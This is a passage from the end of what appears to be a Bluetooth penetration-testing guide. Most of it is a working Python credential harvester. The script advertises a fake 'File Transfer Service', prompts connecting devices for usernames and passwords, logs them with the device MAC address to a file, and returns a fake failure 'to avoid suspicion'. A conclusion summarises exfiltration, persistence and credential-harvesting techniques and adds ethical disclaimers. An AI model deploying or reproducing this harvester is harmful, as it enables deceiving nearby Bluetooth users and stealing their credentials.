def \_\_init\_\_(self):\
self.credentials = \[\]\
self.log_file = "/tmp/bt_credentials.log"

    def setup\_fake\_service(self):  
        \# Create fake service that requires authentication  
        server\_sock \= bluetooth.BluetoothSocket(bluetooth.RFCOMM)  
        server\_sock.bind(("", bluetooth.PORT\_ANY))  
        server\_sock.listen(1)  
            
        \# Advertise fake service  
        bluetooth.advertise\_service(  
            server\_sock, "File Transfer Service",  
            service\_classes=\[bluetooth.SERIAL\_PORT\_CLASS\],  
            profiles=\[bluetooth.SERIAL\_PORT\_PROFILE\]  
        )  
            
        print("Fake authentication service started...")  
            
        while True:  
            client\_sock, client\_info \= server\_sock.accept()  
            self.handle\_auth\_attempt(client\_sock, client\_info)  
        
    def handle\_auth\_attempt(self, client\_sock, client\_info):  
        try:  
            client\_sock.send(b"Authentication required\\nUsername: ")  
            username \= client\_sock.recv(1024).decode().strip()  
                
            client\_sock.send(b"Password: ")  
            password \= client\_sock.recv(1024).decode().strip()  
                
            \# Log credentials  
            cred\_data \= {  
                "timestamp": time.time(),  
                "client\_mac": client\_info\[0\],  
                "username": username,  
                "password": password,  
                "password\_hash": hashlib.md5(password.encode()).hexdigest()  
            }  
                
            self.credentials.append(cred\_data)  
            self.save\_credentials()  
                
            \# Send fake failure to avoid suspicion  
            client\_sock.send(b"Authentication failed\\n")  
                
        except Exception as e:  
            print(f"Error handling auth: {e}")  
        finally:  
            client\_sock.close()  
        
    def save\_credentials(self):  
        with open(self.log\_file, 'w') as f:  
            json.dump(self.credentials, f, indent=2)

if \_\_name\_\_ == "\_\_main\_\_":\
harvester = CredentialHarvester()\
harvester.setup_fake_service()\
EOF

    chmod \+x /tmp/bt\_credential\_logger.py  
    echo "Credential harvesting setup complete"  

}

## **Conclusion**

This comprehensive guide now includes realistic, scenario-based
walkthroughs and extensive post-exploitation techniques for Bluetooth
security testing. The step-by-step scenarios demonstrate how to combine
different tools and techniques in logical sequences, from initial
reconnaissance through complete system compromise.

The post-exploitation section covers advanced techniques including data
exfiltration, privilege escalation, persistence mechanisms, network
pivoting, and credential harvesting - providing a complete picture of
what can occur after initial Bluetooth compromise.

**Important Ethical Reminder**: All techniques and scenarios presented
here are for authorized security testing and educational purposes only.
Always obtain proper written authorization before conducting any
security assessments, and ensure compliance with all applicable laws and
regulations.

**Disclaimer**: This information is provided for educational and
authorized security testing purposes only. Unauthorized access to
Bluetooth devices is illegal and unethical. Always obtain proper
permission before conducting security tests.
